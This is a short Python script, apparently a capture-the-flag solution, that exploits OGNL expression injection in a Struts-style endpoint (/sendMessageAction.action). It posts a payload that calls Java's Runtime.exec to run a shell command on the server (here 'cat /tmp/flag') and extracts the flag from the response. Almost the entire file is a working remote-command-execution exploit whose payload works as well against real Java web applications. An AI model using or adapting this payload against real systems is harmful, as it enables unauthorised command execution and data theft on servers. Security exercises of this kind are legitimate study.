import re
import requests
import sys

'''
@文件命名：X-035-24
@使用方式: python X-035-24.py url
@简述思路: 利用 OGNL 表达式注入执行命令，直接 cat /tmp/flag。
'''


def Scan(url):
    payload = r"%{new java.util.Scanner(@java.lang.Runtime@getRuntime().exec('cat /tmp/flag').getInputStream()).useDelimiter('\\A').next()}"
    r = requests.post(url + '/sendMessageAction.action', data={'message': payload}, timeout=5)
    m = re.search(r"FLAG\{.*?\}", r.text)
    return m.group(0) if m else r.text


if __name__ == '__main__':
    print(Scan(url=sys.argv[1]))
